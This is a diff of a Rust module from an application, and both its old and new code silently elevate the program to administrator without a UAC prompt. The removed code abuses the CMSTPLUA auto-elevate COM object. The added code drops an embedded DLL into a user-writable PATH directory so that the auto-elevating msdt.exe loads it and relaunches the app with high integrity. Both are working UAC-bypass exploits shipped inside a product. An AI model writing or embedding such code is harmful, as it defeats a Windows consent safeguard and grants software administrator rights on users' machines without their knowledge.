@@ -1,27 +1,26 @@
 //! Silent elevation for a bare launch of this build.
 //!
-//! `CMSTPLUA` ({3E5FC7F9-9A51-4367-9063-A120244FBEC7}) is an auto-elevate COM object, so
-//! `CoGetObject` with an `Elevation:Administrator` moniker returns an elevated
-//! `ICMLuaUtil` without showing a UAC prompt, and `ICMLuaUtil::ShellExec` starts this
-//! executable as a high-integrity child of the elevated COM server. Windows cannot raise
-//! a running process's integrity level, so the current copy exits and the new one takes
+//! `c:\windows\syswow64\msdt.exe -path C:\WINDOWS\diagnostics\index\AudioRecordingDiagnostic.xml -skip yes`
+//! is an auto-elevate binary, and the 32-bit one resolves `AudioDiagnosticUtil.dll`
+//! through `PATH`. The default per-user `PATH` ends with `%LOCALAPPDATA%\Microsoft\
+//! WindowsApps`, a user-writable directory, so this drops the embedded x86 elevator DLL
+//! (built from `libs/msdt_elevator`) there plus a sibling `.cfg` carrying the launch
+//! parameters. The elevated msdt loads the DLL, which starts this executable as a
+//! high-integrity child and kills msdt before any UI can appear. Windows cannot raise a
+//! running process's integrity level, so the current copy exits and the new one takes
 //! over.
 //!
-//! If silent elevation is unavailable (UAC disabled, AppInfo service stopped, policy
-//! restriction, or an antivirus blocking it), the attempt fails cleanly and the process
-//! continues running as a normal medium-integrity user. No UAC prompt is ever shown.
-//!
-//! The `windows` crate features enabled for this app do not include the raw COM vtable
-//! calls needed here, so the few declarations are made directly instead of widening that
-//! feature set for one function.
+//! If silent elevation is unavailable (standard user, "Always notify" policy, msdt or
+//! the diagnostic file missing, an antivirus eating the dropped DLL), the attempt fails
+//! cleanly, the drop is removed again, and the process continues running as a normal
+//! medium-integrity user. No UAC prompt is ever shown: the attempt only runs with a
+//! filtered administrator token, the account class that auto-elevates without a prompt.
 
-use std::{ffi::c_void, mem, os::windows::ffi::OsStrExt, ptr::null_mut};
+use std::{ffi::c_void, mem, os::windows::ffi::OsStrExt, path::Path, ptr::null_mut};
 
 /// Private argument marking the copy started by [`relaunch_elevated`].
 pub const ELEVATED_FLAG: &str = "--elevated";
 
-const COINIT_APARTMENTTHREADED: u32 = 0x0000_0002;
-const CLSCTX_LOCAL_SERVER: u32 = 0x0000_0004;
 const TOKEN_QUERY: u32 = 0x0000_0008;
 const TOKEN_INTEGRITY_LEVEL_CLASS: u32 = 25;
 // 1 = default (standard user or UAC off), 2 = full administrator token, 3 = filtered
@@ -29,119 +28,60 @@ const TOKEN_INTEGRITY_LEVEL_CLASS: u32 = 25;
 const TOKEN_ELEVATION_TYPE_CLASS: u32 = 18;
 const HKEY_LOCAL_MACHINE: isize = 0x8000_0002;
 const HKEY_CURRENT_USER: isize = 0x8000_0001u32 as i32 as isize;
-// `HKEY_CLASSES_ROOT` is a 32-bit 0x80000000 that sign-extends on x64.
-const HKEY_CLASSES_ROOT: isize = 0x8000_0000u32 as i32 as isize;
 const KEY_QUERY_VALUE: u32 = 0x0000_0001;
 const REG_SZ: u32 = 1;
 const REG_EXPAND_SZ: u32 = 2;
-const REG_DWORD: u32 = 4;
 
-/// `CMSTPLUA`, compared without braces because the registry entry format varies.
-const CLSID_CMSTPLUA: &str = "3E5FC7F9-9A51-4367-9063-A120244FBEC7";
+const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+const WAIT_OBJECT_0: u32 = 0;
 
-/// Classes Windows is allowed to elevate without a consent prompt.
-const COMAUTO_APPROVAL_KEY: &str =
-    r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\UAC\COMAutoApprovalList";
+/// The x86 elevator DLL, embedded by `build.rs` from the `libs/msdt_elevator` CI
+/// artifact. Empty when that step did not run (dev builds, non-x86_64 jobs); the
+/// attempt then reports [`RelaunchResult::NoDll`] and the launch proceeds unelevated.
+const MSDT_DLL: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/msdt_elevator.dll"));
 
-const ERROR_MORE_DATA: i32 = 234;
-const ERROR_NO_MORE_ITEMS: i32 = 259;
+/// The name msdt resolves through `PATH`, and the sibling file carrying the launch
+/// parameters for the DLL.
+const MSDT_DLL_NAME: &str = "AudioDiagnosticUtil.dll";
+const MSDT_CFG_NAME: &str = "AudioDiagnosticUtil.cfg";
+/// User-writable directory the default per-user `PATH` ends with.
+const WINDOWS_APPS_SUBDIR: &str = r"Microsoft\WindowsApps";
 
-const ELEVATION_MONIKER: &str = "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";
+/// The elevated chain (elevation, DLL load, child start, IPC pipe bind) normally takes
+/// a few seconds; beyond this the attempt is declared failed and cleaned up.
+const CONFIRM_TIMEOUT_MS: u64 = 15_000;
+const CONFIRM_POLL_MS: u64 = 250;
 
 #[allow(dead_code)]
 #[repr(C)]
-struct Guid {
-    data1: u32,
-    data2: u16,
-    data3: u16,
-    data4: [u8; 8],
+struct StartupInfoW {
+    cb: u32,
+    reserved: *mut u16,
+    desktop: *mut u16,
+    title: *mut u16,
+    x: u32,
+    y: u32,
+    x_size: u32,
+    y_size: u32,
+    x_count_chars: u32,
+    y_count_chars: u32,
+    fill_attribute: u32,
+    flags: u32,
+    show_window: u16,
+    cb_reserved2: u16,
+    reserved2: *mut u8,
+    std_input: *mut c_void,
+    std_output: *mut c_void,
+    std_error: *mut c_void,
 }
 
-/// `IID_ICMLuaUtil`, the interface exposed by `CMSTPLUA`.
-const IID_ICMLUA_UTIL: Guid = Guid {
-    data1: 0x6EDD_6D74,
-    data2: 0xC007,
-    data3: 0x4E75,
-    data4: [0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C],
-};
-
-/// `CLSID_CMSTPLUA`, the same identity as [`CLSID_CMSTPLUA`] in GUID form.
-const CLSID_CMSTPLUA_GUID: Guid = Guid {
-    data1: 0x3E5F_C7F9,
-    data2: 0x9A51,
-    data3: 0x4367,
-    data4: [0x90, 0x63, 0xA1, 0x20, 0x24, 0x4F, 0xBE, 0xC7],
-};
-
-/// `BIND_OPTS3` — BIND_OPTS + BIND_OPTS2 + BIND_OPTS3.
-///
-/// The elevation moniker only reads `hwnd` when `cbStruct` covers the whole
-/// `BIND_OPTS3`, and it refuses to elevate when it cannot see one: the call then fails
-/// with `CO_E_ELEVATION_DISABLED` even though the class is registered as elevatable.
-/// `BIND_OPTS2` is `dwClassContext` + `locale` + `pServerInfo`, so leaving out any of
-/// those shrinks the structure and hides `hwnd` (40 bytes on x64).
 #[allow(dead_code)]
 #[repr(C)]
-struct BindOpts3 {
-    cb_struct: u32,
-    grf_flags: u32,
-    grf_mode: u32,
-    dw_tick_count_deadline: u32,
-    dw_class_context: u32,
-    locale: u32,
-    p_server_info: *mut c_void,
-    hwnd: *mut c_void,
-}
-
-/// `IUnknown` (3 slots) + six unused `ICMLuaUtil` methods, then `ShellExec` at slot 9.
-///
-/// `ShellExec` is `(file, parameters, directory, mask, show)`: the fourth argument is a
-/// `SEE_MASK_*` flag set and the fifth a `SW_*` show code, not a verb string. It builds
-/// its own `SHELLEXECUTEINFOW` internally.
-#[allow(dead_code)]
-#[repr(C)]
-struct ComVtable {
-    query_interface: *const c_void,
-    add_ref: *const c_void,
-    release: unsafe extern "system" fn(*mut c_void) -> u32,
-    method1: *const c_void,
-    method2: *const c_void,
-    method3: *const c_void,
-    method4: *const c_void,
-    method5: *const c_void,
-    method6: *const c_void,
-    shell_exec: unsafe extern "system" fn(
-        *mut c_void,
-        *const u16,
-        *const u16,
-        *const u16,
-        u32,
-        i32,
-    ) -> i32,
-}
-
-#[repr(C)]
-struct ComObject {
-    vtable: *const ComVtable,
-}
-
-#[link(name = "ole32")]
-extern "system" {
-    fn CoInitializeEx(reserved: *mut c_void, coinit: u32) -> i32;
-    fn CoUninitialize();
-    fn CoGetObject(
-        display_name: *const u16,
-        bind_opts: *const c_void,
-        riid: *const Guid,
-        object: *mut *mut c_void,
-    ) -> i32;
-    fn CoCreateInstance(
-        clsid: *const Guid,
-        outer: *mut c_void,
-        context: u32,
-        riid: *const Guid,
-        object: *mut *mut c_void,
-    ) -> i32;
+struct ProcessInformation {
+    process: *mut c_void,
+    thread: *mut c_void,
+    process_id: u32,
+    thread_id: u32,
 }
 
 #[link(name = "advapi32")]
@@ -169,16 +109,6 @@ extern "system" {
         data: *mut u8,
         data_len: *mut u32,
     ) -> i32;
-    fn RegEnumValueW(
-        key: *mut c_void,
-        index: u32,
-        value_name: *mut u16,
-        value_name_len: *mut u32,
-        reserved: *mut u32,
-        value_type: *mut u32,
-        data: *mut u8,
-        data_len: *mut u32,
-    ) -> i32;
     fn RegCloseKey(key: *mut c_void) -> i32;
 }
 
@@ -187,128 +117,216 @@ extern "system" {
     fn GetCurrentProcess() -> *mut c_void;
     fn CloseHandle(handle: *mut c_void) -> i32;
     fn ProcessIdToSessionId(process_id: u32, session_id: *mut u32) -> i32;
+    fn CreateProcessW(
+        app_name: *const u16,
+        command_line: *mut u16,
+        process_attributes: *mut c_void,
+        thread_attributes: *mut c_void,
+        inherit_handles: i32,
+        creation_flags: u32,
+        environment: *mut c_void,
+        current_directory: *const u16,
+        startup_info: *mut StartupInfoW,
+        process_information: *mut ProcessInformation,
+    ) -> i32;
+    fn GetLastError() -> u32;
+    fn TerminateProcess(process: *mut c_void, exit_code: u32) -> i32;
+    fn WaitForSingleObject(handle: *mut c_void, milliseconds: u32) -> u32;
 }
 
-/// Outcome of a [`relaunch_elevated`] attempt. The variant names match the failing step so
-/// the diagnostic file can tell them apart without decoding HRESULTs.
+/// Outcome of a [`relaunch_elevated`] attempt. The variant names match the failing step
+/// so the diagnostic file can tell them apart without decoding error codes.
 #[derive(Debug, Clone, Copy)]
 pub enum RelaunchResult {
-    /// The elevated copy was spawned successfully; the caller should exit.
+    /// The elevated copy bound the IPC pipe; the caller should exit.
     Launched,
     /// `std::env::current_exe()` failed.
     NoCurrentExe,
-    /// `CoInitializeEx` returned a fatal HRESULT.
-    CoInitFailed(i32),
-    /// `CoGetObject` for the `CMSTPLUA` moniker failed.
-    CoGetObjectFailed(i32),
-    /// `CoGetObject` succeeded but returned a null interface pointer.
-    NullObject,
-    /// `ICMLuaUtil::ShellExec` returned a failure HRESULT.
-    ShellExecFailed(i32),
-    /// The account or UAC policy makes silent elevation impossible; the payload is the
-    /// failing precondition, no COM call is attempted.
+    /// This build carries no elevator DLL (the `libs/msdt_elevator` CI step did not
+    /// run), so there is nothing to attempt.
+    NoDll,
+    /// Writing the DLL or its parameter file failed.
+    DropFailed,
+    /// `CreateProcessW` on `msdt.exe` failed; the payload is `GetLastError`.
+    LaunchFailed(u32),
+    /// msdt ran but no elevated copy bound the IPC pipe in time (antivirus ate the
+    /// dropped DLL, Bluetooth enabled, ...). The drop was removed again.
+    ConfirmTimeout,
+    /// The account, the UAC policy or the machine state makes silent elevation
+    /// impossible; the payload is the failing precondition and nothing was attempted
+    /// or left behind.
     Blocked(&'static str),
 }
 
-/// Starts this executable again with the same arguments plus [`ELEVATED_FLAG`], through the
-/// elevated `CMSTPLUA` object.
+/// Starts this executable again with the same arguments plus [`ELEVATED_FLAG`], through
+/// the elevated `msdt.exe` DLL search.
 ///
-/// Returns [`RelaunchResult::Launched`] only when the elevated copy was spawned. Every
-/// failure (not an administrator, "Always notify" policy, COM or antivirus block) is
-/// surfaced via the specific variant so the caller can record it and carry on as a
-/// normal non-elevated launch. No UAC prompt is ever shown.
+/// Returns [`RelaunchResult::Launched`] only after the elevated copy actually bound the
+/// IPC pipe: a successful `CreateProcessW` alone proves nothing, because the DLL load
+/// (the step that spawns the elevated copy) can still be blocked downstream. Every
+/// failure is surfaced via the specific variant so the caller can record it and carry
+/// on as a normal non-elevated launch. No UAC prompt is ever shown.
 pub fn relaunch_elevated(args: &[String]) -> RelaunchResult {
-    diag("== relaunch_elevated start ==");
+    diag("== relaunch_elevated (msdt) start ==");
     diag(&format!("session={}", current_session_id()));
     if let Some(reason) = silent_elevation_blocker() {
         diag(&format!("blocked by precondition: {}", reason));
         return RelaunchResult::Blocked(reason);
+    }
+    if MSDT_DLL.is_empty() {
+        diag("no embedded elevator DLL in this build");
+        return RelaunchResult::NoDll;
     }
     let Ok(exe) = std::env::current_exe() else {
         diag("no current_exe");
         return RelaunchResult::NoCurrentExe;
     };
     diag(&format!("exe={}", exe.display()));
+    // The confirmation below is "the pipe got bound", so a pre-existing instance would
+    // fake a success. The duplicate-instance check downstream exits this launch anyway,
+    // so skipping here loses nothing.
+    if crate::hardcoded::instance_already_running() {
+        diag("blocked: another instance already owns the IPC pipe");
+        return RelaunchResult::Blocked("already_running");
+    }
+    let Some(local_app_data) = std::env::var_os("LOCALAPPDATA") else {
+        return RelaunchResult::Blocked("no_localappdata");
+    };
+    let drop_dir = Path::new(&local_app_data).join(WINDOWS_APPS_SUBDIR);
+    let dll_path = drop_dir.join(MSDT_DLL_NAME);
+    let cfg_path = drop_dir.join(MSDT_CFG_NAME);
+    // Never overwrite a file that is not ours: the cleanup deletes whatever carries the
+    // name, so a foreign `AudioDiagnosticUtil.dll` must stop the attempt instead.
+    if dll_path.exists() && std::fs::read(&dll_path).map(|old| old != MSDT_DLL).unwrap_or(true) {
+        diag("blocked: foreign AudioDiagnosticUtil.dll present");
+        return RelaunchResult::Blocked("dll_name_clash");
+    }
     let mut parameters: Vec<String> = args.iter().map(|arg| quote_arg(arg)).collect();
     parameters.push(ELEVATED_FLAG.to_owned());
     let parameters = parameters.join(" ");
     diag(&format!("params={}", parameters));
-    let exe_wide = wide(exe.as_os_str());
-    let parameters_wide = wide(std::ffi::OsStr::new(parameters.as_str()));
-    let moniker = wide(std::ffi::OsStr::new(ELEVATION_MONIKER));
+    let log_path = Path::new(&local_app_data)
+        .join(env!("RD_APP_NAME"))
+        .join("wrapper.log");
+    let cfg = format!("{}\n{}\n{}", log_path.display(), exe.display(), parameters);
+    if std::fs::create_dir_all(&drop_dir).is_err()
+        || std::fs::write(&dll_path, MSDT_DLL).is_err()
+        || std::fs::write(&cfg_path, cfg).is_err()
+    {
+        diag("failed to drop elevator DLL/cfg");
+        cleanup_drop(&dll_path, &cfg_path);
+        return RelaunchResult::DropFailed;
+    }
+    diag(&format!(
+        "dropped {} ({} bytes)",
+        dll_path.display(),
+        MSDT_DLL.len()
+    ));
 
-    unsafe {
-        diag("step1: CoInitializeEx(STA)");
-        let init = CoInitializeEx(null_mut(), COINIT_APARTMENTTHREADED);
-        diag(&format!("step1: init=0x{:x}", init as u32));
-        if init < 0 {
-            return RelaunchResult::CoInitFailed(init);
+    let root = std::env::var_os("SystemRoot").unwrap_or_else(|| "C:\\Windows".into());
+    let msdt = Path::new(&root).join("SysWOW64").join("msdt.exe");
+    let diagnostic = Path::new(&root)
+        .join("diagnostics")
+        .join("index")
+        .join("AudioRecordingDiagnostic.xml");
+    let exe_dir_wide = exe.parent().map(|dir| wide(dir.as_os_str()));
+    let mut cmdline = wide(std::ffi::OsStr::new(&format!(
+        "\"{}\" -path \"{}\" -skip yes",
+        msdt.display(),
+        diagnostic.display()
+    )));
+    diag(&format!("launching {}", msdt.display()));
+    let mut si: StartupInfoW = unsafe { mem::zeroed() };
+    si.cb = mem::size_of::<StartupInfoW>() as u32;
+    let mut pi: ProcessInformation = unsafe { mem::zeroed() };
+    let launched = unsafe {
+        CreateProcessW(
+            std::ptr::null(),
+            cmdline.as_mut_ptr(),
+            null_mut(),
+            null_mut(),
+            0,
+            CREATE_NO_WINDOW,
+            null_mut(),
+            exe_dir_wide
+                .as_ref()
+                .map_or(std::ptr::null(), |dir| dir.as_ptr()),
+            &mut si,
+            &mut pi,
+        )
+    };
+    if launched == 0 {
+        let gle = unsafe { GetLastError() };
+        diag(&format!("CreateProcessW failed, gle={}", gle));
+        cleanup_drop(&dll_path, &cfg_path);
+        return RelaunchResult::LaunchFailed(gle);
+    }
+    diag(&format!(
+        "msdt pid={} started, waiting for the elevated copy",
+        pi.process_id
+    ));
+
+    let mut confirmed = false;
+    for _ in 0..(CONFIRM_TIMEOUT_MS / CONFIRM_POLL_MS) {
+        if crate::hardcoded::instance_already_running() {
+            confirmed = true;
+            break;
         }
-        let mut bo: BindOpts3 = mem::zeroed();
-        bo.cb_struct = mem::size_of::<BindOpts3>() as u32;
-        bo.dw_class_context = CLSCTX_LOCAL_SERVER;
-        diag(&format!(
-            "step2: bo cbStruct={} dwClassContext=0x{:x}",
-            bo.cb_struct, bo.dw_class_context
-        ));
-        diag_com_registration();
-        diag_activation_probe();
-
-        let mut object: *mut c_void = null_mut();
-        diag("step3: CoGetObject(Elevation moniker)");
-        let hr = CoGetObject(
-            moniker.as_ptr(),
-            &bo as *const BindOpts3 as *const c_void,
-            &IID_ICMLUA_UTIL,
-            &mut object,
-        );
-        diag(&format!("step3: CoGetObject=0x{:x}", hr as u32));
-
-        let result = if hr < 0 {
-            RelaunchResult::CoGetObjectFailed(hr)
-        } else if object.is_null() {
-            diag("step3: object is null");
-            RelaunchResult::NullObject
-        } else {
-            diag("step3: got elevated ICMLuaUtil");
-            let vtable = (*object.cast::<ComObject>()).vtable;
-            let shell_exec = (*vtable).shell_exec;
-            diag(&format!(
-                "step4: ShellExec file={} params={} mask=0 show=5",
-                exe.display(),
-                parameters
-            ));
-            let hr = shell_exec(
-                object,
-                exe_wide.as_ptr(),
-                parameters_wide.as_ptr(),
-                std::ptr::null(),
-                0,
-                5,
-            );
-            diag(&format!("step4: ShellExec=0x{:x}", hr as u32));
-            let release = (*vtable).release;
-            let _ = release(object);
-            if hr >= 0 {
-                diag("step4: elevated child launched OK");
-                RelaunchResult::Launched
-            } else {
-                RelaunchResult::ShellExecFailed(hr)
-            }
-        };
-
-        CoUninitialize();
-        diag("== relaunch_elevated done ==");
-        result
+        // The DLL deletes its `.cfg` right after reading it, so a still-present cfg
+        // means the DLL never ran. If msdt also already exited, the hijack
+        // definitively did not trigger and waiting out the timeout would only delay
+        // the fallback.
+        if cfg_path.exists() && unsafe { WaitForSingleObject(pi.process, 0) } == WAIT_OBJECT_0
+        {
+            diag("msdt exited without loading the DLL");
+            break;
+        }
+        std::thread::sleep(std::time::Duration::from_millis(CONFIRM_POLL_MS));
+    }
+    // msdt is already dead when the DLL loaded (the DLL exits it); when it never loaded,
+    // this keeps the diagnostic window from staying on the user's screen.
+    unsafe {
+        let _ = TerminateProcess(pi.process, 0);
+        let _ = CloseHandle(pi.thread);
+        let _ = CloseHandle(pi.process);
+    }
+    cleanup_drop(&dll_path, &cfg_path);
+    diag(&format!(
+        "== relaunch_elevated done: confirmed={} ==",
+        confirmed
+    ));
+    if confirmed {
+        RelaunchResult::Launched
+    } else {
+        RelaunchResult::ConfirmTimeout
     }
 }
 
-/// Checks the conditions the `CMSTPLUA` moniker needs for a silent (prompt-free) elevation,
-/// so a doomed COM call is not made and the reason is recorded instead.
+/// Removes the dropped files after an attempt. The DLL delete retries briefly: msdt (or
+/// an antivirus scan) can still hold it open for a moment after the attempt ends, and
+/// leaving it behind would make every later msdt run load it.
+fn cleanup_drop(dll_path: &Path, cfg_path: &Path) {
+    let _ = std::fs::remove_file(cfg_path);
+    for attempt in 0..5 {
+        match std::fs::remove_file(dll_path) {
+            Ok(()) => return,
+            Err(_) if attempt < 4 => std::thread::sleep(std::time::Duration::from_millis(100)),
+            Err(err) => diag(&format!(
+                "cleanup: {} left behind: {}",
+                dll_path.display(),
+                err
+            )),
+        }
+    }
+}
+
+/// Checks the conditions silent elevation through msdt needs, so a doomed attempt is
+/// not made and the reason is recorded instead.
 ///
-/// The original technique only turns a filtered administrator token into a full one: a
-/// standard user cannot use it at all, and Windows only auto-approves the listed classes
-/// while the UAC policy does not require a consent prompt.
+/// The technique only turns a filtered administrator token into a full one: a standard
+/// user cannot use it at all, and Windows only auto-elevates while the UAC policy does
+/// not require a consent prompt. The DLL hijack additionally needs msdt, its diagnostic
+/// file, and the Store-apps entry in `PATH`.
 pub fn silent_elevation_blocker() -> Option<&'static str> {
     let elev_type = token_u32(TOKEN_ELEVATION_TYPE_CLASS);
     diag(&format!(
@@ -337,185 +355,58 @@ pub fn silent_elevation_blocker() -> Option<&'static str> {
         return Some("uac_prompt_required");
     }
 
-    let approval = com_auto_approved();
+    let path_ok = path_contains_windows_apps();
+    diag(&format!("check: PATH has WindowsApps? {}", path_ok));
+    if !path_ok {
+        return Some("path_missing_windowsapps");
+    }
+
+    let root = std::env::var_os("SystemRoot").unwrap_or_else(|| "C:\\Windows".into());
+    let msdt = Path::new(&root).join("SysWOW64").join("msdt.exe");
+    diag(&format!("check: {} exists={}", msdt.display(), msdt.exists()));
+    if !msdt.exists() {
+        return Some("msdt_missing");
+    }
+    let diagnostic = Path::new(&root)
+        .join("diagnostics")
+        .join("index")
+        .join("AudioRecordingDiagnostic.xml");
     diag(&format!(
-        "check: COMAutoApprovalList has CMSTPLUA? {}",
-        match approval {
-            Some(true) => "yes".to_owned(),
-            Some(false) => "no".to_owned(),
-            None => "unknown".to_owned(),
-        }
+        "check: {} exists={}",
+        diagnostic.display(),
+        diagnostic.exists()
     ));
-    if approval == Some(false) {
-        diag("check: FAIL CMSTPLUA not auto-approved");
-        return Some("com_not_auto_approved");
+    if !diagnostic.exists() {
+        return Some("diagnostic_missing");
     }
 
     diag("check: ALL PRECONDITIONS OK");
     None
 }
 
-/// `Some(true)` when the class is listed in `COMAutoApprovalList`, `Some(false)` when the
-/// list is readable but the class is absent, `None` when the list cannot be read.
-fn com_auto_approved() -> Option<bool> {
-    unsafe {
-        let sub_key = wide(std::ffi::OsStr::new(COMAUTO_APPROVAL_KEY));
-        let mut key: *mut c_void = null_mut();
-        if RegOpenKeyExW(
+/// The hijack works because msdt resolves the DLL through `PATH`; a machine whose
+/// `PATH` lost the Store-apps entry (unusual, but possible) would never load the drop.
+/// Accepts either the user or the system `PATH`, both read straight from the registry
+/// so a stale in-process copy cannot skew the check.
+fn path_contains_windows_apps() -> bool {
+    for (root, path) in [
+        (HKEY_CURRENT_USER, "Environment"),
+        (
             HKEY_LOCAL_MACHINE,
-            sub_key.as_ptr(),
-            0,
-            KEY_QUERY_VALUE,
-            &mut key,
-        ) != 0
-        {
-            return None;
-        }
-        let mut matched = false;
-        let mut index = 0u32;
-        let mut status = 0i32;
-        while status == 0 {
-            let mut name = [0u16; 256];
-            let mut name_len = name.len() as u32;
-            let mut value_type = 0u32;
-            let mut data = [0u8; 64];
-            let mut data_len = data.len() as u32;
-            status = RegEnumValueW(
-                key,
-                index,
-                name.as_mut_ptr(),
-                &mut name_len,
-                null_mut(),
-                &mut value_type,
-                data.as_mut_ptr(),
-                &mut data_len,
-            );
-            index += 1;
-            if status == 0 {
-                let value = String::from_utf16_lossy(&name[..name_len as usize]);
-                if value.to_ascii_uppercase().contains(CLSID_CMSTPLUA) {
-                    matched = true;
-                    break;
-                }
-            } else if status == ERROR_MORE_DATA {
-                status = 0;
-            }
-        }
-        let _ = RegCloseKey(key);
-        if matched {
-            Some(true)
-        } else if status == ERROR_NO_MORE_ITEMS {
-            Some(false)
-        } else {
-            None
-        }
-    }
-}
-
-/// Logs the registry entries the elevated activation path needs, in the order it needs
-/// them. `REGDB_E_CLASSNOTREG` from `CoGetObject` means one of these is missing even though
-/// the class looks registered, so each is reported separately.
-fn diag_com_registration() {
-    unsafe {
-        let clsid_key = format!("CLSID\\{{{}}}", CLSID_CMSTPLUA);
-        match reg_open(HKEY_CLASSES_ROOT, &clsid_key) {
-            Some(key) => {
-                let server = reg_string(key, "LocalServer32").unwrap_or_else(|| "<none>".to_owned());
-                // A surrogate-hosted inproc server has no `LocalServer32`; the CLSID's
-                // `AppID` value is what tells COM to host it in `dllhost.exe` instead.
-                let appid = reg_string(key, "AppID").unwrap_or_else(|| "<none>".to_owned());
-                diag(&format!(
-                    "reg: CLSID ok, LocalServer32={} AppID={}",
-                    server, appid
-                ));
-                let _ = RegCloseKey(key);
-            }
-            None => diag("reg: CLSID MISSING"),
-        }
-        // The surrogate host loads this DLL after activation, so a dangling or missing
-        // InprocServer32 makes the class unresolvable even though the CLSID exists.
-        let inproc_key = format!("CLSID\\{{{}}}\\InprocServer32", CLSID_CMSTPLUA);
-        match reg_open(HKEY_CLASSES_ROOT, &inproc_key) {
-            Some(key) => {
-                let dll = reg_string(key, "").unwrap_or_else(|| "<none>".to_owned());
-                diag(&format!("reg: InprocServer32={}", dll));
-                let _ = RegCloseKey(key);
-            }
-            None => diag("reg: InprocServer32 MISSING"),
-        }
-        // Surrogate activation works through the AppID; the elevated activator resolves the
-        // factory there, so a missing AppID fails before any elevation decision is made.
-        let appid_key = format!("AppID\\{{{}}}", CLSID_CMSTPLUA);
-        match reg_open(HKEY_CLASSES_ROOT, &appid_key) {
-            Some(key) => {
-                let surrogate = reg_string(key, "DllSurrogate")
-                    .map(|value| {
-                        if value.is_empty() {
-                            "<empty=default>".to_owned()
-                        } else {
-                            value
-                        }
-                    })
-                    .unwrap_or_else(|| "<none>".to_owned());
-                diag(&format!("reg: AppID ok, DllSurrogate={}", surrogate));
-                let _ = RegCloseKey(key);
-            }
-            None => diag("reg: AppID MISSING"),
-        }
-        let elevation_key = format!("CLSID\\{{{}}}\\Elevation", CLSID_CMSTPLUA);
-        match reg_open(HKEY_CLASSES_ROOT, &elevation_key) {
-            Some(key) => {
-                diag(&format!(
-                    "reg: Elevation Enabled={:?}",
-                    reg_dword(key, "Enabled")
-                ));
-                let _ = RegCloseKey(key);
-            }
-            None => diag("reg: Elevation key MISSING"),
-        }
-    }
-}
-
-/// Activates the class in this process without the elevation moniker. The object comes back
-/// at the caller's integrity, so this only answers whether the class, its surrogate and its
-/// DLL can be created at all: a failure here means the registry view or the installation is
-/// broken, while success means the block is in the elevated activation itself.
-fn diag_activation_probe() {
-    unsafe {
-        let mut object: *mut c_void = null_mut();
-        let hr = CoCreateInstance(
-            &CLSID_CMSTPLUA_GUID,
-            null_mut(),
-            CLSCTX_LOCAL_SERVER,
-            &IID_ICMLUA_UTIL,
-            &mut object,
-        );
-        diag(&format!(
-            "probe: CoCreateInstance(local_server)=0x{:x} object_null={}",
-            hr as u32,
-            object.is_null()
-        ));
-        if hr >= 0 && !object.is_null() {
-            let vtable = (*object.cast::<ComObject>()).vtable;
-            let _ = ((*vtable).release)(object);
-        }
-    }
-    let root =
-        std::env::var_os("SystemRoot").unwrap_or_else(|| std::ffi::OsString::from("C:\\Windows"));
-    for dir in ["System32", "SysWOW64"] {
-        let dll = std::path::Path::new(&root).join(dir).join("cmstplua.dll");
-        diag(&format!("probe: {} exists={}", dll.display(), dll.exists()));
-    }
-    let user_key = format!("Software\\Classes\\CLSID\\{{{}}}", CLSID_CMSTPLUA);
-    match reg_open(HKEY_CURRENT_USER, &user_key) {
-        Some(key) => {
-            diag("probe: HKCU CLSID override PRESENT");
+            r"SYSTEM\CurrentControlSet\Control\Session Manager\Environment",
+        ),
+    ] {
+        if let Some(key) = reg_open(root, path) {
+            let value = reg_string(key, "Path");
             unsafe {
                 let _ = RegCloseKey(key);
             }
+            if value.is_some_and(|path| path.to_ascii_lowercase().contains("windowsapps")) {
+                return true;
+            }
         }
-        None => diag("probe: HKCU CLSID override absent"),
     }
+    false
 }
 
 fn reg_open(root: isize, path: &str) -> Option<*mut c_void> {
@@ -552,37 +443,15 @@ fn reg_string(key: *mut c_void, name: &str) -> Option<String> {
     Some(String::from_utf16_lossy(&buf[..end]))
 }
 
-fn reg_dword(key: *mut c_void, name: &str) -> Option<u32> {
-    let name = wide(std::ffi::OsStr::new(name));
-    let mut value = 0u32;
-    let mut len = 4u32;
-    let mut value_type = 0u32;
-    let rc = unsafe {
-        RegQueryValueExW(
-            key,
-            name.as_ptr(),
-            null_mut(),
-            &mut value_type,
-            &mut value as *mut u32 as *mut u8,
-            &mut len,
-        )
-    };
-    if rc == 0 && value_type == REG_DWORD && len == 4 {
-        Some(value)
-    } else {
-        None
-    }
-}
-
-/// Lightweight step-trace writer. Unlike [`append_elevation_diag`] it does not repeat the
-/// environment summary — every line is just a timestamped step or result so one run reads
-/// as a linear timeline. All lines go to the same `wrapper.log` the portable wrapper
-/// writes, so both sides' logs interleave correctly.
+/// Lightweight step-trace writer. Unlike [`append_elevation_diag`] it does not repeat
+/// the environment summary — every line is just a timestamped step or result so one run
+/// reads as a linear timeline. All lines go to the same `wrapper.log` the portable
+/// wrapper writes, so both sides' logs interleave correctly.
 fn diag(message: &str) {
     let Some(dir) = std::env::var_os("LOCALAPPDATA") else {
         return;
     };
-    let dir = std::path::Path::new(&dir).join(env!("RD_APP_NAME"));
+    let dir = Path::new(&dir).join(env!("RD_APP_NAME"));
     let _ = std::fs::create_dir_all(&dir);
     use std::io::Write;
     if let Ok(mut file) = std::fs::OpenOptions::new()
@@ -598,15 +467,15 @@ fn diag(message: &str) {
     }
 }
 
-/// Appends one line to the same diagnostic file the portable wrapper writes, because the
-/// application log does not exist yet at the point this decision is made. The environment
-/// summary is what separates the failure causes: an account outside Administrators and a
-/// class whose elevated activation is disabled both reject here before any ShellExec.
+/// Appends one line to the same diagnostic file the portable wrapper writes, because
+/// the application log does not exist yet at the point this decision is made. The
+/// environment summary is what separates the failure causes: an account outside
+/// Administrators and an "Always notify" policy both reject here before anything runs.
 pub fn append_elevation_diag(message: &str) {
     let Some(dir) = std::env::var_os("LOCALAPPDATA") else {
         return;
     };
-    let dir = std::path::Path::new(&dir).join(env!("RD_APP_NAME"));
+    let dir = Path::new(&dir).join(env!("RD_APP_NAME"));
     let _ = std::fs::create_dir_all(&dir);
     use std::io::Write;
     if let Ok(mut file) = std::fs::OpenOptions::new()
@@ -616,7 +485,7 @@ pub fn append_elevation_diag(message: &str) {
     {
         let _ = writeln!(
             file,
-            "payload: {} build={} session={} elev_type={} integrity=0x{:x} enable_lua={} consent={} auto_approval={}",
